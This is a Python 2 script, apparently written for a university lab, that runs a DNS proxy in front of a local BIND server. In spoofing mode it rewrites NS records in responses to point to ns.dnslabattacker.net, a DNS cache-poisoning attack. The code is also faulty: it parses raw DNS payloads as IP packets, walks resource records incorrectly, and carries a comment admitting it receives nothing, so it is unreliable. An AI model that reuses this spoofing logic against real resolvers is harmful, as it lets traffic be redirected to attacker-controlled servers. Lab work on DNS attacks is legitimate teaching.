#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
print("SPOOF setting: ", SPOOF)
# Address of the BIND server (assuming localhost)
dns_server = '127.0.0.1'

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# reuse socket
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to the proxy port
sock.bind(('0.0.0.0', port))
print("DNS Proxy running on port {}".format(port))

def modify_ns_records(packet):
    """
    Modify NS records in the DNS response packet to point to ns.dnslabattacker.net
    """
    if DNS in packet and packet[DNS].qr == 1:  # qr=1 indicates a response
        # Iterate over all resource records (answers, authoritative servers, additional records)
        for rr in packet[DNS].an, packet[DNS].ns, packet[DNS].ar:
            if rr is not None:
                for i in range(rr.count):
                    # Check for NS records and modify them
                    if rr[i].type == 2:  # Type 2 corresponds to NS records
                        rr[i].rdata = 'ns.dnslabattacker.net'
    return packet

while True:
    try:
        data, addr = sock.recvfrom(1024) # TODO: currently doesn't seem to be able to receive anything
        print("Received DNS query from {}".format(addr))

        if SPOOF:
            # Modify the query to target the BIND server
            query = IP(data) / UDP(dport=dns_port)
            response = sr1(query, verbose=0)
            
            # Modify the BIND server's response
            modified_response = modify_ns_records(response)
            # Send the modified response back to the original requester
            sock.sendto(bytes(modified_response), addr)
            print("Sent modified DNS response to {}".format(addr))
        else:
            # Forward the query to the BIND server if not spoofing
            dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_sock.sendto(data, (dns_server, dns_port))
            dns_response, _ = dns_sock.recvfrom(1024)
            sock.sendto(dns_response, addr)
            print("Forwarded DNS response back to {}".format(addr))
            dns_sock.close()
    except Exception as e:
        print("An error occurred: {}".format(str(e)))
        break

sock.close()